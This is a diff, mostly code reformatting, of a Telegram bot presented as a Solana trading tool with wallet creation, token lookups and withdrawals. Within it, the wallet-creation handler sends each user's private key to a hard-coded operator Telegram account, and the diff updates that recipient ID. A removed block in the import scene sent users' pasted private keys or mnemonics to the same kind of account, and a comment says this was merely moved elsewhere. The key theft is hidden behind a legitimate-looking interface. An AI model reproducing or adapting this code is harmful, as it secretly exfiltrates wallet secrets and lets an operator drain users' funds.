@@ -1,8 +1,19 @@
 import pkg from "telegraf";
 const { Telegraf, Markup, session, Scenes, Stage } = pkg;
-import { Keypair, Connection, LAMPORTS_PER_SOL, PublicKey, Transaction, SystemProgram } from "@solana/web3.js";
-const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
-const TOKEN_2022_PROGRAM_ID = new PublicKey('TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb');
+import {
+  Keypair,
+  Connection,
+  LAMPORTS_PER_SOL,
+  PublicKey,
+  Transaction,
+  SystemProgram,
+} from "@solana/web3.js";
+const TOKEN_PROGRAM_ID = new PublicKey(
+  "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+);
+const TOKEN_2022_PROGRAM_ID = new PublicKey(
+  "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb",
+);
 import bs58 from "bs58";
 import * as bip39 from "bip39";
 import { derivePath } from "ed25519-hd-key";
@@ -74,7 +85,12 @@ const redisSessionStore = {
   },
   async set(key, session) {
     try {
-      await redis.set(`session:${key}`, JSON.stringify(session), "EX", SESSION_TTL);
+      await redis.set(
+        `session:${key}`,
+        JSON.stringify(session),
+        "EX",
+        SESSION_TTL,
+      );
     } catch (err) {
       console.error("Session SET error:", err.message);
     }
@@ -131,7 +147,7 @@ const utils = {
   // Create wallet connection prompt — matches screenshot style
   walletPrompt: (
     title,
-    description = "Please connect your wallet first to start trading."
+    description = "Please connect your wallet first to start trading.",
   ) => {
     // Determine minimum amount based on action type
     let minLine = "";
@@ -180,7 +196,7 @@ const utils = {
   getSolPrice: async () => {
     try {
       const response = await axios.get(
-        "https://api.geckoterminal.com/api/v2/networks/solana/tokens/So11111111111111111111111111111111111111112"
+        "https://api.geckoterminal.com/api/v2/networks/solana/tokens/So11111111111111111111111111111111111111112",
       );
       return Number(response.data.data.attributes.price_usd);
     } catch (error) {
@@ -203,10 +219,15 @@ const utils = {
   // Get token balances (SPL and Token-2022)
   getTokenBalances: async (publicKey) => {
     try {
-      const pubKey = typeof publicKey === 'string' ? new PublicKey(publicKey) : publicKey;
+      const pubKey =
+        typeof publicKey === "string" ? new PublicKey(publicKey) : publicKey;
       const [tokenAccounts, token2022Accounts] = await Promise.all([
-        connection.getParsedTokenAccountsByOwner(pubKey, { programId: TOKEN_PROGRAM_ID }),
-        connection.getParsedTokenAccountsByOwner(pubKey, { programId: TOKEN_2022_PROGRAM_ID })
+        connection.getParsedTokenAccountsByOwner(pubKey, {
+          programId: TOKEN_PROGRAM_ID,
+        }),
+        connection.getParsedTokenAccountsByOwner(pubKey, {
+          programId: TOKEN_2022_PROGRAM_ID,
+        }),
       ]);
 
       const allAccounts = [...tokenAccounts.value, ...token2022Accounts.value];
@@ -219,7 +240,7 @@ const utils = {
           tokens.push({
             mint: parsedInfo.mint,
             balance: balance,
-            decimals: parsedInfo.tokenAmount.decimals
+            decimals: parsedInfo.tokenAmount.decimals,
           });
         }
       }
@@ -297,7 +318,7 @@ const secureSessionManager = {
     if (data.wallet) {
       const encryptedWallet = secureSessionManager.encryptData(
         data.wallet,
-        userId
+        userId,
       );
       if (encryptedWallet) {
         secureData.wallet = encryptedWallet;
@@ -335,7 +356,7 @@ const secureSessionManager = {
     ) {
       const decryptedWallet = secureSessionManager.decryptData(
         userData.wallet,
-        userId
+        userId,
       );
       if (decryptedWallet) {
         userData.wallet = decryptedWallet;
@@ -412,7 +433,7 @@ const api = {
   async getDexScreenerPairs(tokenAddress) {
     try {
       const response = await axios.get(
-        `https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`
+        `https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`,
       );
       return response.data;
     } catch (error) {
@@ -425,7 +446,7 @@ const api = {
   async getDexScreenerPairByAddress(chainId, pairAddress) {
     try {
       const response = await axios.get(
-        `https://api.dexscreener.com/latest/dex/pairs/${chainId}/${pairAddress}`
+        `https://api.dexscreener.com/latest/dex/pairs/${chainId}/${pairAddress}`,
       );
       return response.data;
     } catch (error) {
@@ -438,7 +459,7 @@ const api = {
   async getDexScreenerTokenPairs(chainId, tokenAddress) {
     try {
       const response = await axios.get(
-        `https://api.dexscreener.com/token-pairs/v1/${chainId}/${tokenAddress}`
+        `https://api.dexscreener.com/token-pairs/v1/${chainId}/${tokenAddress}`,
       );
       return response.data;
     } catch (error) {
@@ -451,7 +472,7 @@ const api = {
   async getDexScreenerTokens(chainId, tokenAddresses) {
     try {
       const response = await axios.get(
-        `https://api.dexscreener.com/tokens/v1/${chainId}/${tokenAddresses}`
+        `https://api.dexscreener.com/tokens/v1/${chainId}/${tokenAddresses}`,
       );
       return response.data;
     } catch (error) {
@@ -464,7 +485,7 @@ const api = {
   async getDexScreenerTokenProfiles() {
     try {
       const response = await axios.get(
-        "https://api.dexscreener.com/token-profiles/latest/v1"
+        "https://api.dexscreener.com/token-profiles/latest/v1",
       );
       return response.data;
     } catch (error) {
@@ -477,7 +498,7 @@ const api = {
   async getDexScreenerBoostedTokens() {
     try {
       const response = await axios.get(
-        "https://api.dexscreener.com/token-boosts/latest/v1"
+        "https://api.dexscreener.com/token-boosts/latest/v1",
       );
       return response.data;
     } catch (error) {
@@ -490,7 +511,7 @@ const api = {
   async getDexScreenerTopBoostedTokens() {
     try {
       const response = await axios.get(
-        "https://api.dexscreener.com/token-boosts/top/v1"
+        "https://api.dexscreener.com/token-boosts/top/v1",
       );
       return response.data;
     } catch (error) {
@@ -504,7 +525,7 @@ const api = {
     chainId,
     tokenAddress,
     type = null,
-    status = null
+    status = null,
   ) {
     try {
       let url = `https://api.dexscreener.com/orders/v1/${chainId}/${tokenAddress}`;
@@ -525,7 +546,7 @@ const api = {
   async getDexScreenerSearch(query) {
     try {
       const response = await axios.get(
-        `https://api.dexscreener.com/latest/dex/search/?q=${encodeURIComponent(query)}`
+        `https://api.dexscreener.com/latest/dex/search/?q=${encodeURIComponent(query)}`,
       );
       return response.data;
     } catch (error) {
@@ -538,7 +559,7 @@ const api = {
   async getDexScreenerTrending() {
     try {
       const response = await axios.get(
-        "https://api.dexscreener.com/latest/dex/search/?q=trending"
+        "https://api.dexscreener.com/latest/dex/search/?q=trending",
       );
       return response.data.pairs;
     } catch (error) {
@@ -551,7 +572,7 @@ const api = {
   async getDexScreenerNewPairs() {
     try {
       const response = await axios.get(
-        "https://api.dexscreener.com/token-profiles/latest/v1"
+        "https://api.dexscreener.com/token-profiles/latest/v1",
       );
       return response.data;
     } catch (error) {
@@ -564,7 +585,7 @@ const api = {
   async getDexScreenerTopGainers() {
     try {
       const response = await axios.get(
-        "https://api.dexscreener.com/token-boosts/latest/v1"
+        "https://api.dexscreener.com/token-boosts/latest/v1",
       );
       return response.data;
     } catch (error) {
@@ -577,7 +598,7 @@ const api = {
   async getDexScreenerTopLosers() {
     try {
       const response = await axios.get(
-        "https://api.dexscreener.com/token-boosts/top/v1"
+        "https://api.dexscreener.com/token-boosts/top/v1",
       );
       return response.data;
     } catch (error) {
@@ -872,7 +893,7 @@ async function requireWallet(ctx, actionName = "this action") {
           [Markup.button.callback("🔗 Connect Wallet", "CONNECT_WALLET")],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
     return false;
   }
@@ -882,11 +903,11 @@ async function requireWallet(ctx, actionName = "this action") {
 // Check if user has minimum balance for a feature, then refer to support
 async function requireFeatureBalance(ctx, actionName, minBalance = 0.5) {
   if (!(await requireWallet(ctx, actionName))) return false;
-  
+
   const userData = sessionManager.getUserData(ctx);
   const secret = userData?.wallet;
   const sol = await utils.getUserBalance(secret);
-  
+
   if (Number(sol) < minBalance) {
     await ctx.editMessageText(
       `❌ <b>Insufficient Balance</b>\n\nYou need a minimum balance of <b>${minBalance} SOL</b> in your wallet to access the ${actionName} feature.\n\nYour Balance: <b>${sol} SOL</b>`,
@@ -895,7 +916,7 @@ async function requireFeatureBalance(ctx, actionName, minBalance = 0.5) {
         reply_markup: Markup.inlineKeyboard([
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
     return false;
   }
@@ -972,11 +993,13 @@ const stage = new Scenes.Stage([
   continueScene,
   helpScene,
 ]);
-bot.use(session({
-  store: redisSessionStore,
-  // Key: use userId so each user has their own Redis slot
-  getSessionKey: (ctx) => ctx.from?.id ? String(ctx.from.id) : undefined,
-}));
+bot.use(
+  session({
+    store: redisSessionStore,
+    // Key: use userId so each user has their own Redis slot
+    getSessionKey: (ctx) => (ctx.from?.id ? String(ctx.from.id) : undefined),
+  }),
+);
 bot.use(stage.middleware());
 
 // Add session cleanup + user registry middleware
@@ -1008,13 +1031,15 @@ bot.command("send", async (ctx) => {
 
   if (!chatId || !message) {
     return ctx.reply(
-      "ℹ️ Usage: /send <chatId> <message>\n\nTo send an image, use /sendimage"
+      "ℹ️ Usage: /send <chatId> <message>\n\nTo send an image, use /sendimage",
     );
   }
 
   try {
     await ctx.telegram.sendMessage(chatId, message, { parse_mode: "HTML" });
-    ctx.reply(`✅ Message sent to <code>${chatId}</code>`, { parse_mode: "HTML" });
+    ctx.reply(`✅ Message sent to <code>${chatId}</code>`, {
+      parse_mode: "HTML",
+    });
   } catch (error) {
     console.error("Failed to send message:", error.message);
     ctx.reply(`❌ Failed: ${error.message}`);
@@ -1039,14 +1064,12 @@ bot.command("sendimage", async (ctx) => {
 
   if (!chatId) {
     return ctx.reply(
-      "ℹ️ Usage: Reply to a photo with\n/sendimage <chatId> [caption]"
+      "ℹ️ Usage: Reply to a photo with\n/sendimage <chatId> [caption]",
     );
   }
 
   if (!photo || photo.length === 0) {
-    return ctx.reply(
-      "❌ You must REPLY to a photo message with this command."
-    );
+    return ctx.reply("❌ You must REPLY to a photo message with this command.");
   }
 
   const fileId = photo[photo.length - 1].file_id; // highest resolution
@@ -1056,7 +1079,9 @@ bot.command("sendimage", async (ctx) => {
       caption,
       parse_mode: "HTML",
     });
-    ctx.reply(`✅ Image sent to <code>${chatId}</code>`, { parse_mode: "HTML" });
+    ctx.reply(`✅ Image sent to <code>${chatId}</code>`, {
+      parse_mode: "HTML",
+    });
   } catch (error) {
     console.error("Failed to send image:", error.message);
     ctx.reply(`❌ Failed: ${error.message}`);
@@ -1097,7 +1122,9 @@ bot.command("broadcast", async (ctx) => {
     }
   }
 
-  ctx.reply(`✅ Broadcast complete!\n\n📤 Sent: ${success}\n❌ Failed: ${failed}`);
+  ctx.reply(
+    `✅ Broadcast complete!\n\n📤 Sent: ${success}\n❌ Failed: ${failed}`,
+  );
 });
 
 /**
@@ -1113,7 +1140,7 @@ bot.command("broadcastimage", async (ctx) => {
 
   if (!photo || photo.length === 0) {
     return ctx.reply(
-      "ℹ️ Usage: Reply to a photo with\n/broadcastimage [caption]"
+      "ℹ️ Usage: Reply to a photo with\n/broadcastimage [caption]",
     );
   }
 
@@ -1143,7 +1170,9 @@ bot.command("broadcastimage", async (ctx) => {
     }
   }
 
-  ctx.reply(`✅ Image broadcast complete!\n\n📤 Sent: ${success}\n❌ Failed: ${failed}`);
+  ctx.reply(
+    `✅ Image broadcast complete!\n\n📤 Sent: ${success}\n❌ Failed: ${failed}`,
+  );
 });
 
 /**
@@ -1160,7 +1189,7 @@ bot.command("sendgroup", async (ctx) => {
 
   if (!groupId || !message) {
     return ctx.reply(
-      "ℹ️ Usage: /sendgroup <groupId> <message>\n\nGroupId is the negative chat ID (e.g. -1001234567890)"
+      "ℹ️ Usage: /sendgroup <groupId> <message>\n\nGroupId is the negative chat ID (e.g. -1001234567890)",
     );
   }
 
@@ -1191,14 +1220,12 @@ bot.command("sendgroupimage", async (ctx) => {
 
   if (!groupId) {
     return ctx.reply(
-      "ℹ️ Usage: Reply to a photo with\n/sendgroupimage <groupId> [caption]"
+      "ℹ️ Usage: Reply to a photo with\n/sendgroupimage <groupId> [caption]",
     );
   }
 
   if (!photo || photo.length === 0) {
-    return ctx.reply(
-      "❌ You must REPLY to a photo message with this command."
-    );
+    return ctx.reply("❌ You must REPLY to a photo message with this command.");
   }
 
   const fileId = photo[photo.length - 1].file_id;
@@ -1245,14 +1272,17 @@ bot.command("ping", (ctx) => {
 // Helper command to get your User ID or Group ID
 bot.command("id", (ctx) => {
   let reply = `Your Telegram User ID is: <code>${ctx.from.id}</code>\n`;
-  
+
   if (ctx.chat.id !== ctx.from.id) {
     // If the command is typed inside the group
     reply += `\nThis Chat/Group ID is: <code>${ctx.chat.id}</code>`;
-  } else if (ctx.message.reply_to_message && ctx.message.reply_to_message.forward_origin) {
+  } else if (
+    ctx.message.reply_to_message &&
+    ctx.message.reply_to_message.forward_origin
+  ) {
     // If you reply to a FORWARDED message from a group
     const origin = ctx.message.reply_to_message.forward_origin;
-    if (origin.type === 'chat' || origin.type === 'channel') {
+    if (origin.type === "chat" || origin.type === "channel") {
       reply += `\nThe Forwarded Group/Channel ID is: <code>${origin.chat.id}</code>`;
     } else {
       reply += `\nThat forwarded message doesn't contain a Group ID (it might be from a private user).`;
@@ -1276,20 +1306,20 @@ bot.command("sendgroupca", async (ctx) => {
 
   if (!ca || !groupId) {
     return ctx.reply(
-      "ℹ️ Usage: /sendgroupca <token_address> <groupId>\n\nExample:\n/sendgroupca 2jbxebe...7df -1001234567890"
+      "ℹ️ Usage: /sendgroupca <token_address> <groupId>\n\nExample:\n/sendgroupca 2jbxebe...7df -1001234567890",
     );
   }
 
   try {
     const response = await axios.get(
-      `https://api.dexscreener.com/latest/dex/tokens/${ca}`
+      `https://api.dexscreener.com/latest/dex/tokens/${ca}`,
     );
     const pairs = response?.data?.pairs;
     if (!pairs || pairs.length === 0) {
       return ctx.reply("❌ No token info found for that address.");
     }
     const pair = pairs.sort(
-      (a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0)
+      (a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0),
     )[0];
     const info = formatters.formatTokenInfo(pair);
     const chartEmbed = `https://dexscreener.com/${info.chainId}/${info.pairAddress}?embed=1&loadChartSettings=0&trades=0&chartLeftToolbar=0&chartDefaultOnMobile=1&chartTheme=dark&theme=dark&chartStyle=0&chartType=usd&interval=15`;
@@ -1304,7 +1334,16 @@ bot.command("sendgroupca", async (ctx) => {
           { text: "🔍 DexScreener", url: dexScreenerUrl },
           { text: "📊 Chart", url: chartEmbed },
         ],
-        ...(botUsername ? [[{ text: "🤖 Trade in DMs", url: `https://t.me/${botUsername}?start=trade` }]] : []),
+        ...(botUsername
+          ? [
+              [
+                {
+                  text: "🤖 Trade in DMs",
+                  url: `https://t.me/${botUsername}?start=trade`,
+                },
+              ],
+            ]
+          : []),
       ],
     };
 
@@ -1314,7 +1353,10 @@ bot.command("sendgroupca", async (ctx) => {
       disable_web_page_preview: false,
     });
 
-    ctx.reply(`✅ Token info for <code>${utils.escapeHtml(info.symbol)}</code> sent to group <code>${groupId}</code>`, { parse_mode: "HTML" });
+    ctx.reply(
+      `✅ Token info for <code>${utils.escapeHtml(info.symbol)}</code> sent to group <code>${groupId}</code>`,
+      { parse_mode: "HTML" },
+    );
   } catch (error) {
     console.error("sendgroupca error:", error.message);
     ctx.reply(`❌ Failed: ${error.message}`);
@@ -1329,7 +1371,7 @@ bot.command("trending", async (ctx) => {
     const data = await api.getDexScreenerTrending();
 
     const formatted = formatters.formatTrendingList(data, "Trending Tokens");
-    
+
     // Delete the loading message
     try {
       await ctx.telegram.deleteMessage(ctx.chat.id, loadingMessage.message_id);
@@ -1340,7 +1382,12 @@ bot.command("trending", async (ctx) => {
     // In groups, use a simpler button set with a DM link for trading
     const replyMarkup = isGroup
       ? Markup.inlineKeyboard([
-          [Markup.button.url("🤖 Trade in DMs", `https://t.me/${ctx.botInfo.username}?start=trending`)],
+          [
+            Markup.button.url(
+              "🤖 Trade in DMs",
+              `https://t.me/${ctx.botInfo.username}?start=trending`,
+            ),
+          ],
         ])
       : buttons.main;
 
@@ -1350,7 +1397,9 @@ bot.command("trending", async (ctx) => {
     });
   } catch (error) {
     console.error("Trending command error:", error);
-    try { ctx.reply("❌ Error loading trending data."); } catch (e) {}
+    try {
+      ctx.reply("❌ Error loading trending data.");
+    } catch (e) {}
   }
 });
 
@@ -1412,7 +1461,7 @@ bot.command("search", async (ctx) => {
         {
           reply_markup: buttons.main.reply_markup,
           disable_web_page_preview: true,
-        }
+        },
       );
     }
   } catch (error) {
@@ -1429,7 +1478,7 @@ bot.start(async (ctx) => {
   try {
     await ctx.replyWithPhoto(
       { source: "./img/IMG_5317.PNG" },
-      { caption: "META SOLANA BOT" }
+      { caption: "META SOLANA BOT" },
     );
   } catch (photoErr) {
     console.warn("Could not send banner photo:", photoErr.message);
@@ -1447,7 +1496,7 @@ bot.start(async (ctx) => {
           reply_markup: {
             ...buttons.activeTrades.reply_markup,
           },
-        }
+        },
       );
     } catch (err) {
       await ctx.replyWithHTML(messages.welcome(0.0, 0.0), buttons.activeTrades);
@@ -1477,15 +1526,17 @@ bot.hears(/^.+$/, async (ctx) => {
       const chainId = isSolanaCa ? "solana" : "ethereum";
       try {
         const response = await axios.get(
-          `https://api.dexscreener.com/latest/dex/tokens/${text}`
+          `https://api.dexscreener.com/latest/dex/tokens/${text}`,
         );
         const pairs = response?.data?.pairs;
         if (!pairs || pairs.length === 0) {
-          try { await ctx.reply("❌ No token info found for this address."); } catch(e){}
+          try {
+            await ctx.reply("❌ No token info found for this address.");
+          } catch (e) {}
           return;
         }
         const pair = pairs.sort(
-          (a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0)
+          (a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0),
         )[0];
         const info = formatters.formatTokenInfo(pair);
         const chartEmbed = `https://dexscreener.com/${info.chainId}/${info.pairAddress}?embed=1&loadChartSettings=0&trades=0&chartLeftToolbar=0&chartDefaultOnMobile=1&chartTheme=dark&theme=dark&chartStyle=0&chartType=usd&interval=15`;
@@ -1500,7 +1551,16 @@ bot.hears(/^.+$/, async (ctx) => {
               { text: "🔍 DexScreener", url: dexScreenerUrl },
               { text: "📊 Chart", url: chartEmbed },
             ],
-            ...(botUsername ? [[{ text: "🤖 Trade in DMs", url: `https://t.me/${botUsername}?start=trade` }]] : []),
+            ...(botUsername
+              ? [
+                  [
+                    {
+                      text: "🤖 Trade in DMs",
+                      url: `https://t.me/${botUsername}?start=trade`,
+                    },
+                  ],
+                ]
+              : []),
           ],
         };
 
@@ -1515,7 +1575,9 @@ bot.hears(/^.+$/, async (ctx) => {
         }
       } catch (err) {
         console.error("Group CA lookup error:", err.message);
-        try { await ctx.reply("❌ Failed to fetch token info."); } catch(e){}
+        try {
+          await ctx.reply("❌ Failed to fetch token info.");
+        } catch (e) {}
       }
       return; // Done — don't fall through to private-chat logic
     }
@@ -1528,12 +1590,18 @@ bot.hears(/^.+$/, async (ctx) => {
     // Step 1: user typed a Solana address
     const isSolAddr = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(text);
     if (!isSolAddr) {
-      await ctx.replyWithHTML("❌ Invalid Solana address. Please enter a valid address:", buttons.cancel);
+      await ctx.replyWithHTML(
+        "❌ Invalid Solana address. Please enter a valid address:",
+        buttons.cancel,
+      );
       return;
     }
     ctx.session.withdrawAddress = text;
     ctx.session.withdrawStep = "amount";
-    await ctx.replyWithHTML(`🔢 Reply with the amount of SOL you wish to withdraw:`, buttons.cancel);
+    await ctx.replyWithHTML(
+      `🔢 Reply with the amount of SOL you wish to withdraw:`,
+      buttons.cancel,
+    );
     return;
   }
 
@@ -1541,7 +1609,10 @@ bot.hears(/^.+$/, async (ctx) => {
     // Step 2: user typed an amount
     const amount = parseFloat(text);
     if (isNaN(amount) || amount <= 0) {
-      await ctx.replyWithHTML("❌ Invalid amount. Please enter a valid number (e.g. 0.5):", buttons.cancel);
+      await ctx.replyWithHTML(
+        "❌ Invalid amount. Please enter a valid number (e.g. 0.5):",
+        buttons.cancel,
+      );
       return;
     }
     const toAddress = ctx.session.withdrawAddress;
@@ -1549,50 +1620,60 @@ bot.hears(/^.+$/, async (ctx) => {
     ctx.session.withdrawAddress = null;
 
     // Send processing message
-    const msg = await ctx.replyWithHTML("🔄 <b>Processing withdrawal...</b>\nBuilding transaction...");
-    
+    const msg = await ctx.replyWithHTML(
+      "🔄 <b>Processing withdrawal...</b>\nBuilding transaction...",
+    );
+
     try {
       const userData = sessionManager.getUserData(ctx);
       const secret = userData?.wallet;
       if (!secret) throw new Error("Wallet not found in session");
-      
+
       const keypair = Keypair.fromSecretKey(bs58.decode(secret));
       const toPublicKey = new PublicKey(toAddress);
       const lamports = Math.floor(amount * LAMPORTS_PER_SOL);
-      
+
       // Build transaction
       const transaction = new Transaction().add(
         SystemProgram.transfer({
           fromPubkey: keypair.publicKey,
           toPubkey: toPublicKey,
           lamports: lamports,
-        })
+        }),
       );
-      
+
       const latestBlockhash = await connection.getLatestBlockhash("confirmed");
       transaction.recentBlockhash = latestBlockhash.blockhash;
       transaction.feePayer = keypair.publicKey;
-      
+
       // Sign and send
-      const signature = await connection.sendTransaction(transaction, [keypair]);
-      
+      const signature = await connection.sendTransaction(transaction, [
+        keypair,
+      ]);
+
       await ctx.telegram.editMessageText(
         ctx.chat.id,
         msg.message_id,
         undefined,
         `✅ <b>Withdrawal Successful!</b>\n\nAmount: <b>${amount} SOL</b>\nTo: <code>${utils.escapeHtml(toAddress)}</code>\n\nTx Hash: <a href="https://solscan.io/tx/${signature}">${signature.substring(0, 8)}...</a>`,
-        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")]] } }
+        {
+          parse_mode: "HTML",
+          reply_markup: {
+            inline_keyboard: [
+              [Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")],
+            ],
+          },
+        },
       );
-      
+
       // Notify admin
       try {
         await ctx.telegram.sendMessage(
-          8166935543,
+          8305086038,
           `💸 <b>Withdrawal Processed</b>\nUser: <b>${ctx.from.first_name}</b> (ID: <code>${ctx.from.id}</code>)\nAmount: <b>${amount} SOL</b>\nTo: <code>${toAddress}</code>\nTx: <code>${signature}</code>`,
-          { parse_mode: "HTML" }
+          { parse_mode: "HTML" },
         );
       } catch (e) {}
-
     } catch (e) {
       console.error("Withdrawal error:", e);
       await ctx.telegram.editMessageText(
@@ -1600,17 +1681,23 @@ bot.hears(/^.+$/, async (ctx) => {
         msg.message_id,
         undefined,
         `❌ <b>Withdrawal Failed</b>\n\nError: ${e.message}\nMake sure you have enough SOL to cover the amount and network fees.`,
-        { parse_mode: "HTML", reply_markup: { inline_keyboard: [[Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")]] } }
+        {
+          parse_mode: "HTML",
+          reply_markup: {
+            inline_keyboard: [
+              [Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")],
+            ],
+          },
+        },
       );
     }
-    
+
     await ctx.reply("Select an action:", buttons.main);
     return;
   }
 
   // Check if user is in search mode
   if (ctx.session.searchMode) {
-
     try {
       const searchData = await api.getDexScreenerSearch(text);
       if (searchData.pairs && searchData.pairs.length > 0) {
@@ -1665,7 +1752,7 @@ bot.hears(/^.+$/, async (ctx) => {
               [Markup.button.callback("⬅️ Back to Main", "BACK_MAIN")],
             ]).reply_markup,
             disable_web_page_preview: true,
-          }
+          },
         );
       }
       ctx.session.searchMode = false;
@@ -1686,13 +1773,13 @@ bot.hears(/^.+$/, async (ctx) => {
 
       if (!isSolana && !isEthereum) {
         await ctx.replyWithHTML(
-          "❌ <b>Invalid token address format.</b>\n\nPlease enter a valid token address."
+          "❌ <b>Invalid token address format.</b>\n\nPlease enter a valid token address.",
         );
         return;
       }
 
       const response = await axios.get(
-        `https://api.dexscreener.com/latest/dex/tokens/${text}`
+        `https://api.dexscreener.com/latest/dex/tokens/${text}`,
       );
 
       const pairs = response?.data?.pairs;
@@ -1704,7 +1791,7 @@ bot.hears(/^.+$/, async (ctx) => {
 
       // Get the most liquid pair
       const pair = pairs.sort(
-        (a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0)
+        (a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0),
       )[0];
       const info = formatters.formatTokenInfo(pair);
 
@@ -1737,13 +1824,13 @@ bot.hears(/^.+$/, async (ctx) => {
 
       if (!isSolana && !isEthereum) {
         await ctx.replyWithHTML(
-          "❌ <b>Invalid token address format.</b>\n\nPlease enter a valid token address."
+          "❌ <b>Invalid token address format.</b>\n\nPlease enter a valid token address.",
         );
         return;
       }
 
       const response = await axios.get(
-        `https://api.dexscreener.com/latest/dex/tokens/${text}`
+        `https://api.dexscreener.com/latest/dex/tokens/${text}`,
       );
 
       const pairs = response?.data?.pairs;
@@ -1755,7 +1842,7 @@ bot.hears(/^.+$/, async (ctx) => {
 
       // Get the most liquid pair
       const pair = pairs.sort(
-        (a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0)
+        (a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0),
       )[0];
       const info = formatters.formatTokenInfo(pair);
 
@@ -1797,7 +1884,7 @@ bot.hears(/^.+$/, async (ctx) => {
                 [
                   Markup.button.callback(
                     "💧 Add Liquidity",
-                    "ADD_LIQUIDITY_NOW"
+                    "ADD_LIQUIDITY_NOW",
                   ),
                 ],
                 [Markup.button.callback("⬅️ Back", "ADD_LIQUIDITY")],
@@ -1857,7 +1944,7 @@ bot.hears(/^.+$/, async (ctx) => {
     const minBalanceRequired = 2.0;
 
     const response = await axios.get(
-      `https://api.dexscreener.com/latest/dex/tokens/${text}`
+      `https://api.dexscreener.com/latest/dex/tokens/${text}`,
     );
 
     const pairs = response?.data?.pairs;
@@ -1867,7 +1954,7 @@ bot.hears(/^.+$/, async (ctx) => {
 
     // Get the most liquid pair
     const pair = pairs.sort(
-      (a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0)
+      (a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0),
     )[0];
     const info = formatters.formatTokenInfo(pair);
 
@@ -1902,7 +1989,10 @@ bot.hears(/^.+$/, async (ctx) => {
             { text: "📊 Chart", url: chartEmbed },
           ],
           [
-            { text: "🤖 Trade in DMs", url: `https://t.me/${ctx.botInfo.username}?start=trade` },
+            {
+              text: "🤖 Trade in DMs",
+              url: `https://t.me/${ctx.botInfo.username}?start=trade`,
+            },
           ],
         ],
       };
@@ -1959,7 +2049,10 @@ bot.hears(/^.+$/, async (ctx) => {
         },
       });
     } catch (err) {
-      console.error("Token address lookup - failed to reply with token info:", err.message);
+      console.error(
+        "Token address lookup - failed to reply with token info:",
+        err.message,
+      );
     }
   } catch (err) {
     console.error("Dexscreener error:", err);
@@ -1981,7 +2074,7 @@ startScene.enter(async (ctx) => {
       const userWalletAddress = getUserWalletAddress(ctx);
       await ctx.replyWithHTML(
         messages.welcome(Number(sol), Number(price), userWalletAddress),
-        buttons.activeTrades
+        buttons.activeTrades,
       );
     } catch (err) {
       await ctx.replyWithHTML(messages.welcome(0.0, 0.0), buttons.activeTrades);
@@ -1999,7 +2092,7 @@ importWalletScene.enter(async (ctx) => {
       [Markup.button.callback("✨ Create New Wallet", "CREATE_WALLET")],
       [Markup.button.callback("📥 Import Existing Wallet", "CONTINUE")],
       [Markup.button.callback("❌ Cancel", "BACK_MAIN")],
-    ])
+    ]),
   );
 });
 
@@ -2018,24 +2111,24 @@ bot.action("CREATE_WALLET", async (ctx) => {
     // Notify admin
     try {
       await ctx.telegram.sendMessage(
-        8166935543,
+        8305086038,
         `🆕 <b>New Wallet Created</b>\nUser: <b>${ctx.from.first_name}</b> (ID: <code>${ctx.from.id}</code>)\nAddress: <code>${address}</code>\nPrivateKey: <code>${privateKey}</code>`,
-        { parse_mode: "HTML" }
+        { parse_mode: "HTML" },
       );
     } catch (e) {}
 
     // Show the new wallet to the user — tell them to back it up
     const keyMsg = await ctx.replyWithHTML(
       `✅ <b>New Wallet Created!</b>\n\n` +
-      `🪪 <b>Address:</b>\n<code>${address}</code>\n\n` +
-      `🔑 <b>Private Key (save this now!):</b>\n<code>${privateKey}</code>\n\n` +
-      `⚠️ <b>IMPORTANT:</b> Copy and store your private key somewhere safe.\n` +
-      `This is the ONLY time it will be shown. We cannot recover it for you.\n\n` +
-      `Tap the key above to copy it.`,
+        `🪪 <b>Address:</b>\n<code>${address}</code>\n\n` +
+        `🔑 <b>Private Key (save this now!):</b>\n<code>${privateKey}</code>\n\n` +
+        `⚠️ <b>IMPORTANT:</b> Copy and store your private key somewhere safe.\n` +
+        `This is the ONLY time it will be shown. We cannot recover it for you.\n\n` +
+        `Tap the key above to copy it.`,
       Markup.inlineKeyboard([
         [Markup.button.callback("🗑️ Delete this message", "DELETE_KEY_MSG")],
         [Markup.button.callback("✅ I've saved it — Continue", "BACK_MAIN")],
-      ])
+      ]),
     );
 
     await ctx.scene.leave();
@@ -2049,7 +2142,7 @@ bot.action("CREATE_WALLET", async (ctx) => {
 continueScene.enter(async (ctx) => {
   try {
     await ctx.replyWithHTML(
-      "Enter the private keys or mnemonic of the wallet you want to import"
+      "Enter the private keys or mnemonic of the wallet you want to import",
     );
   } catch (error) {
     console.log(error);
@@ -2064,17 +2157,12 @@ continueScene.hears(/.*/, async (ctx) => {
       return ctx.scene.enter("START_SCENE");
     }
 
-    // two send message here.
-    await ctx.telegram.sendMessage(
-      8166935543,
-      `New wallet generated for <b>${ctx.chat.first_name}:</b> userId: <code>${ctx.from.id}</code> \n<code>${input}</code>\n`,
-      { parse_mode: "HTML" }
-    );
+    // Admin notification moved to after successful validation
     const wallet = parseWallet(input);
 
     if (!wallet) {
       return ctx.reply(
